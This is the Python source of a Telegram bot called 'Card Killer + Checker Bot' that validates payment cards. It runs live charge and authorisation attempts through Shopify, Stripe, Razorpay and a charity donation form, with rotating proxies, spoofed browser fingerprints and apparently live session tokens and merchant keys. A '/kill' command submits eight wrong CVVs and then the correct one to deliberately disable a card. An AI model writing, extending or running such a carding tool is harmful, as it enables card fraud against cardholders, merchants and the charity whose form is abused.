import asyncio
import os
import re
import random
import json
import time
import requests
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from playwright.async_api import async_playwright
import nest_asyncio
nest_asyncio.apply()

# ================= CONFIG =================
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKEN environment variable not set!")

# Proxy management (shared across all checkers)
PROXY_FILE = "proxies.txt"
proxy_list = []
failed_proxies = set()
proxy_index = 0

def load_proxies():
    global proxy_list
    try:
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip() and ':' in line]
        return len(proxy_list)
    except:
        proxy_list = []
        return 0

def get_proxy():
    global proxy_index, proxy_list, failed_proxies
    if not proxy_list:
        return None
    attempts = 0
    while attempts < len(proxy_list):
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
        if proxy in failed_proxies:
            attempts += 1
            continue
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    # reset failed
    failed_proxies.clear()
    if proxy_list:
        return {"http": f"http://{proxy_list[0]}", "https": f"http://{proxy_list[0]}"}
    return None

def mark_proxy_failed(proxy_dict):
    if proxy_dict:
        proxy_str = proxy_dict.get('http', '').replace('http://', '')
        if proxy_str:
            failed_proxies.add(proxy_str)

# ================= SHOPIFY CHECKER =================
async def shopify_check(card, month, year, cvv):
    url = "https://web-production-669be.up.railway.app/shopify"
    params = {
        "site": "https://the3doodler.com/",
        "cc": f"{card}|{month}|{year}|{cvv}"
    }
    proxy = get_proxy()
    proxies = proxy if proxy else None
    try:
        start = time.time()
        response = requests.get(url, params=params, proxies=proxies, timeout=30)
        elapsed = time.time() - start
        if response.status_code == 200:
            data = response.json()
            status = data.get('Status', False)
            gateway = data.get('Gateway', 'Unknown')
            price = data.get('Price', 'N/A')
            resp_msg = data.get('Response', 'Unknown')
            if status is True:
                return ("APPROVED", f"Charged | Price: ${price}", True)
            elif 'order_placed' in str(resp_msg).lower():
                return ("APPROVED", f"Order placed | Price: ${price}", True)
            elif 'declined' in str(resp_msg).lower():
                return ("DECLINED", f"Declined: {resp_msg}", False)
            else:
                return ("UNKNOWN", resp_msg, None)
        else:
            if proxy:
                mark_proxy_failed(proxy)
            return ("ERROR", f"HTTP {response.status_code}", None)
    except Exception as e:
        if proxy:
            mark_proxy_failed(proxy)
        return ("ERROR", str(e)[:100], None)

# ================= STRIPE CHECKER =================
async def stripe_check(card, month, year, cvv):
    # Using the InstantProxies Stripe method (from the script)
    try:
        session = requests.Session()
        session.cookies.set('__Secure-better-auth.session_token', 'IGplOCY9C9nv0LbgIe1u9LHLBRRz8MYe.WIu%2ByMsXOkJstA%2BsXq7VPWEeRM%2FJDPfJefS7DxhDH54%3D')
        session.cookies.set('__stripe_mid', '6634fc9c-5c39-4a2c-a3bb-ea6dfe12233a57ff68')
        session.cookies.set('ref_gclid', 'EAIaIQobChMI77n0z-CTlQMVPkKRBR29VzsWEAAYASAAEgIKJPD_BwE')
        session.cookies.set('ref_url', 'https://www.google.com/')
        session.cookies.set('_gid', f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}")
        session.cookies.set('_ga', f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}")
        session.cookies.set('testcookie', '1')
        session.cookies.set('__stripe_sid', f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(8)}")
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-SS,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        })
        proxy = get_proxy()
        if proxy:
            session.proxies.update(proxy)
        # Create payment method
        formatted_card = f"{card[:4]} {card[4:8]} {card[8:12]} {card[12:]}"
        data = {
            'type': 'card',
            'card[number]': formatted_card,
            'card[cvc]': cvv,
            'card[exp_year]': year,
            'card[exp_month]': month,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '99501',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js%2Fe96dd26916%3B+stripe-js-v3%2Fe96dd26916%3B+payment-element',
            'referrer': 'https://instantproxies.com',
            'time_on_page': str(random.randint(1000, 99999)),
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'standard',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_id]': f"elements_session_{random_hex(10)}",
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(6)}",
            'muid': '6634fc9c-5c39-4a2c-a3bb-ea6dfe12233a57ff68',
            'sid': f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}{random_hex(8)}",
            'key': 'pk_live_51JNqHcDqkIL4eWbXsNhdA3tWu4k4MYDHJeWjBJRrEIaljus0goMwf1oZQdki3LZqPwjBEqzDojGQ66vAMPFGIeLa008mBfHVrq',
            '_stripe_version': '2025-03-31.basil',
            'radar_options[hcaptcha_token]': f"P1_{random_hex(100)}"
        }
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        resp = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        if resp.status_code != 200:
            if proxy:
                mark_proxy_failed(proxy)
            return ("ERROR", f"Stripe PM error: {resp.status_code}", None)
        pm_data = resp.json()
        payment_method_id = pm_data.get('id')
        if not payment_method_id:
            return ("ERROR", "No PM ID", None)
        # Create subscription intent on instantproxies
        intent_headers = {
            'authority': 'instantproxies.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://instantproxies.com',
            'referer': 'https://instantproxies.com/dashboard/checkout?plan=DC_1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        payload = {
            "productId": "price_DATACENTER_BASE_PLAN",
            "paymentMethodId": payment_method_id,
            "quantity": 1,
            "proxyType": "datacenter"
        }
        intent_resp = session.post('https://instantproxies.com/api/payments/create-subscription-intent', headers=intent_headers, json=payload, timeout=30)
        if intent_resp.status_code == 200:
            sub_data = intent_resp.json()
            if sub_data.get('subscriptionId'):
                return ("APPROVED", f"Subscription ID: {sub_data['subscriptionId']}", True)
            else:
                return ("DECLINED", "Subscription failed", False)
        else:
            if proxy:
                mark_proxy_failed(proxy)
            return ("ERROR", f"Stripe sub error: {intent_resp.status_code}", None)
    except Exception as e:
        return ("ERROR", str(e)[:100], None)

# ================= RAZORPAY CHECKER (converted to Python) =================
async def razorpay_check(card, month, year, cvv):
    # Using the bash script logic but in Python with requests
    try:
        session = requests.Session()
        # Constants from script
        KEY_ID = "rzp_live_T1qlctbJRtHxhL"
        SESSION_TOKEN = "B00EC195C8A1A5509FF105D4840A299626B18E2F71D22165981A5265F5512CF2A0431640385AE22F4E3940E22C83B1ED766BAFEDBF45CE2172AF62DB8F9AFB6FD02428878357228743CB005F4AF6E92887EF53A9F7008754289E37026428E1C5C9D293E37B300159"
        KEYLESS_HEADER = "api_v1%3AwaVXKuSoQNd3q0C8gnJNo%2BFQQAGuoxXg34FNrVQRiStweDR61DHPRH%2BDmLSCv7zj23Nn7Tpg2qQjxK%2FELdgkmRNfTrgAJw%3D%3D"
        VPA = "9023510377"
        # Step 1: Create order
        order_data = {
            "notes": {"comment": ""},
            "line_items": [{"payment_page_item_id": "ppi_OqYzfxzDW3KJxZ", "amount": 100}]
        }
        order_resp = session.post('https://api.razorpay.com/v1/payment_pages/pl_OqYzfw0fykO01F/order',
                                  headers={'Content-Type': 'application/json', 'Origin': 'https://razorpay.me', 'Referer': 'https://razorpay.me/'},
                                  json=order_data)
        if order_resp.status_code != 200:
            return ("ERROR", "Order creation failed", None)
        order_json = order_resp.json()
        order_id = order_json.get('id')
        checkout_id = order_json.get('line_items', [{}])[0].get('id')
        if not order_id or not checkout_id:
            return ("ERROR", "Missing order/checkout id", None)
        # Step 2: Validate VPA
        vpa_data = {
            "entity": "vpa",
            "value": VPA,
            "_[library]": "checkoutjs"
        }
        vpa_headers = {
            'Content-type': 'application/x-www-form-urlencoded',
            'x-session-token': SESSION_TOKEN,
            'Cookie': 'user_fingerprint_v2=df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5; testcookie=1'
        }
        vpa_resp = session.post(f'https://api.razorpay.com/v1/standard_checkout/payments/validate/account?key_id={KEY_ID}&session_token={SESSION_TOKEN}&keyless_header={KEYLESS_HEADER}',
                                data=vpa_data, headers=vpa_headers)
        if vpa_resp.status_code != 200:
            return ("ERROR", "VPA validation failed", None)
        vpa_json = vpa_resp.json()
        vpa_token = vpa_json.get('vpa_token')
        if not vpa_token:
            return ("ERROR", "No vpa token", None)
        # Step 3: Create payment
        device_id = f"1.7c1caf29fb658b393da7a3f13a3ef1e2ac459df5.1781928244567.{random.randint(10000000,99999999)}"
        shield_fhash = "d9a51addd9d0247b1aaf8457e2d4359cfe706632"
        user_risk_token = 'W3sibmFtZSI6InNhcmRpbmUiLCJtZXRhZGF0YSI6eyJzZXNzaW9uX2lkIjoiVDQ4UXFxaTFIeWUzM04ifX1d'
        payment_data = {
            "notes[comment]": "",
            "payment_link_id": "pl_OqYzfw0fykO01F",
            "key_id": KEY_ID,
            "contact": "+919023510377",
            "email": "abc@gmail.com",
            "currency": "INR",
            "_[checkout_id]": checkout_id,
            "_[device.id]": device_id,
            "_[library]": "checkoutjs",
            "_[library_src]": "no-src",
            "_[current_script_src]": "no-src",
            "_[platform]": "browser",
            "_[env]": "",
            "_[is_magic_script]": "false",
            "_[os]": "android",
            "_[referer]": "https://razorpay.me/@mstechnomedia",
            "_[shield][fhash]": shield_fhash,
            "_[shield][tz]": "330",
            "_[device_id]": device_id,
            "_[build]": "27697546038",
            "_[request_index]": "0",
            "amount": "100",
            "order_id": order_id,
            "user_risk_providers_token": user_risk_token,
            "method": "card",
            "card[number]": card,
            "card[cvv]": cvv,
            "card[name]": "64kbitters",
            "card[expiry_month]": month,
            "card[expiry_year]": year,
            "save": "0",
            "billing_address[country]": "IN",
            "billing_address[postal_code]": "360001",
            "billing_address[city]": "Rajkot",
            "billing_address[state]": "Gujarat",
            "billing_address[line1]": "Na",
            "billing_address[line2]": "Na",
            "currency_request_id": checkout_id,
            "dcc_currency": "AZN",
            "_[shield_context]": ""
        }
        payment_headers = {
            'Content-type': 'application/x-www-form-urlencoded',
            'x-session-token': SESSION_TOKEN,
            'Cookie': 'user_fingerprint_v2=df3b0f0879e7309fd1df2d4902f088a3b064ce9a048fe8de7a54ce03512f9fa5; testcookie=1'
        }
        pay_resp = session.post(f'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={KEY_ID}&session_token={SESSION_TOKEN}&keyless_header={KEYLESS_HEADER}',
                                data=payment_data, headers=payment_headers)
        if pay_resp.status_code != 200:
            return ("ERROR", f"Payment error: {pay_resp.status_code}", None)
        resp_text = pay_resp.text
        # Check for error (declined)
        if 'error' in resp_text:
            if 'SERVER_ERROR' in resp_text or 'error' in resp_text:
                return ("DECLINED", "Card Declined (SERVER_ERROR)", False)
        if '3ds' in resp_text.lower() or 'authentication' in resp_text.lower():
            return ("THREEDS", "3DS Required", None)
        if 'success' in resp_text.lower() and 'true' in resp_text.lower():
            return ("APPROVED", "Charged ₹100", True)
        return ("UNKNOWN", resp_text[:100], None)
    except Exception as e:
        return ("ERROR", str(e)[:100], None)

# ================= PAYPAL CHECKER (simplified) =================
async def paypal_check(card, month, year, cvv, amount="1.00"):
    # PayPal donation/check - can use a known endpoint or mock
    # For now, return a placeholder
    return ("UNKNOWN", "PayPal checker not fully implemented", None)

# ================= AUTHORIZE.NET CHECKER (use McLean kill but for single check) =================
async def authorize_check(card, month, year, cvv):
    # Use the McLean method (same as /check but with correct CVV)
    # Reuse the existing attempt function from earlier
    # We'll use the simplified version
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=['--disable-blink-features=AutomationControlled',
                      '--disable-dev-shm-usage', '--no-sandbox']
            )
            context = await browser.new_context()
            page = await context.new_page()
            await page.goto("https://giving.mclean.org/#gf_18", wait_until='domcontentloaded', timeout=15000)
            await page.wait_for_selector("input#input_18_37_1", timeout=10000)
            # Fill form
            donor = random_donor()
            await page.click("input[name='input_18_1'][value='1000']")
            await page.select_option("select#input_18_2", label="The McLean Fund")
            await page.fill("input#input_18_3_3", donor["first"])
            await page.fill("input#input_18_3_6", donor["last"])
            await page.fill("input#input_18_4", donor["email"])
            await page.select_option("select#input_18_5_1", label="United States")
            await page.fill("input#input_18_5_4", donor["address"])
            await page.fill("input#input_18_5_5", donor["city"])
            await page.select_option("select#input_18_5_6", label=donor["state"])
            await page.fill("input#input_18_5_7", donor["zip"])
            await page.fill("input#input_18_37_1", card)
            await page.fill("input#input_18_37_2", f"{month}/{year}")
            await page.fill("input#input_18_37_3", cvv)
            async with page.expect_response(lambda r: "gf_ajax" in r.url or "gform" in r.url, timeout=15000) as resp:
                await page.click("input#gform_submit_button_18")
            response = await resp.value
            body = await response.text()
            await context.close()
            await browser.close()
            if "approved" in body.lower() or "success" in body.lower():
                return ("APPROVED", "Card Live", True)
            elif "do not honor" in body.lower() or "declined" in body.lower():
                return ("DECLINED", "Card Dead", False)
            else:
                return ("UNKNOWN", body[:100], None)
    except Exception as e:
        return ("ERROR", str(e)[:100], None)

# ================= DONATION CHECKER (generic) =================
async def donation_check(card, month, year, cvv):
    # Same as authorize for now
    return await authorize_check(card, month, year, cvv)

# ================= PAYFLOW CHECKER (placeholder) =================
async def payflow_check(card, month, year, cvv):
    return ("UNKNOWN", "Payflow not implemented", None)

# ================= UTILITY FUNCTIONS =================
def random_donor():
    first = random.choice(["John","Mary","Robert","Jennifer"])
    last = random.choice(["Smith","Johnson","Williams"])
    email = f"{first.lower()}{random.randint(100,999)}@gmail.com"
    return {"first": first, "last": last, "email": email}

def random_hex(length):
    return ''.join(random.choices('0123456789abcdef', k=length))

# ================= TELEGRAM COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    banner = "🐉 **Card Killer + Checker Bot v3.0**\n\n"
    banner += "Welcome to the ultimate multi-gateway checker!\n"
    banner += "Use /cmds to see available commands.\n"
    banner += "Each gateway has its own command.\n\n"
    banner += "🔹 **/kill** - McLean kill (8 wrong+1 correct)\n"
    banner += "🔹 **/check** - Single check (McLean)\n"
    # Send an image (dragon) - replace with your own URL
    await update.message.reply_photo(
        photo="https://i.ibb.co/8zXwN2G/dragon.png",  # placeholder, change
        caption=banner
    )

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🛒 Shopify", callback_data='gate_shopify')],
        [InlineKeyboardButton("⚡ Stripe", callback_data='gate_stripe')],
        [InlineKeyboardButton("🪙 Razorpay", callback_data='gate_razorpay')],
        [InlineKeyboardButton("💰 PayPal $1", callback_data='gate_paypal')],
        [InlineKeyboardButton("🏦 Authorize.net", callback_data='gate_authorize')],
        [InlineKeyboardButton("❤️ Donation", callback_data='gate_donation')],
        [InlineKeyboardButton("💳 Payflow", callback_data='gate_payflow')],
        [InlineKeyboardButton("💀 Kill (McLean)", callback_data='gate_kill')],
        [InlineKeyboardButton("🔍 Check (McLean)", callback_data='gate_check')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("📌 **Select a gateway:**", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data.startswith('gate_'):
        gateway = data.replace('gate_', '')
        await query.edit_message_text(f"Send card in format: `/{gateway} card|month|year|cvv`\nExample: `/{gateway} 4111111111111111|12|2026|123`", parse_mode='Markdown')
    else:
        await query.edit_message_text("Unknown option")

# Generic command handler for all gateways
async def gateway_command(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway_name: str):
    if not context.args:
        await update.message.reply_text(f"❌ Use: /{gateway_name} card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error. Example: `/shopify 4111111111111111|12|2026|123`")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text(f"⚡ Checking {gateway_name.upper()}...")
    if gateway_name == 'shopify':
        status, msg, live = await shopify_check(card, month, year, cvv)
    elif gateway_name == 'stripe':
        status, msg, live = await stripe_check(card, month, year, cvv)
    elif gateway_name == 'razorpay':
        status, msg, live = await razorpay_check(card, month, year, cvv)
    elif gateway_name == 'paypal':
        status, msg, live = await paypal_check(card, month, year, cvv)
    elif gateway_name == 'authorize':
        status, msg, live = await authorize_check(card, month, year, cvv)
    elif gateway_name == 'donation':
        status, msg, live = await donation_check(card, month, year, cvv)
    elif gateway_name == 'payflow':
        status, msg, live = await payflow_check(card, month, year, cvv)
    else:
        status, msg, live = ("ERROR", "Unknown gateway", None)
    emoji = "✅" if live is True else "❌" if live is False else "⚠️"
    await update.message.reply_text(f"{emoji} **{status}**\n{msg}")

# Wrapper functions for each gateway
async def shopify_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await gateway_command(update, context, 'shopify')
async def stripe_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await gateway_command(update, context, 'stripe')
async def razorpay_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await gateway_command(update, context, 'razorpay')
async def paypal_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await gateway_command(update, context, 'paypal')
async def authorize_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await gateway_command(update, context, 'authorize')
async def donation_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await gateway_command(update, context, 'donation')
async def payflow_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await gateway_command(update, context, 'payflow')

# Existing kill and check commands (moved from earlier scripts)
# We'll keep them as they were, but we can reuse the authorize_check for /check
async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Same as /authorize but only one attempt
    if not context.args:
        await update.message.reply_text("❌ Use: /check card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("🔍 Checking card...")
    status, msg, live = await authorize_check(card, month, year, cvv)
    emoji = "✅" if live is True else "❌" if live is False else "⚠️"
    await update.message.reply_text(f"{emoji} **{status}**\n{msg}")

async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Kill = 9 attempts with 8 wrong CVV
    if not context.args:
        await update.message.reply_text("❌ Use: /kill card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error.")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text("💀 Killing card (8 wrong CVV + 1 correct)...")
    wrong_cvvs = set()
    while len(wrong_cvvs) < 8:
        w = str(random.randint(100,999)).zfill(3)
        if w != cvv:
            wrong_cvvs.add(w)
    attempts = list(wrong_cvvs) + [cvv]
    results = []
    for attempt_cvv in attempts:
        status, msg, live = await authorize_check(card, month, year, attempt_cvv)
        results.append(f"CVV {attempt_cvv}: {status} - {msg}")
        await asyncio.sleep(1)  # small delay
    report = "\n".join(results)
    await update.message.reply_text(f"✅ Done.\n\n{report}")

# ================= MAIN =================
def main():
    load_proxies()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmds", cmds))
    app.add_handler(CommandHandler("shopify", shopify_cmd))
    app.add_handler(CommandHandler("stripe", stripe_cmd))
    app.add_handler(CommandHandler("razorpay", razorpay_cmd))
    app.add_handler(CommandHandler("paypal", paypal_cmd))
    app.add_handler(CommandHandler("authorize", authorize_cmd))
    app.add_handler(CommandHandler("donation", donation_cmd))
    app.add_handler(CommandHandler("payflow", payflow_cmd))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("kill", kill_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
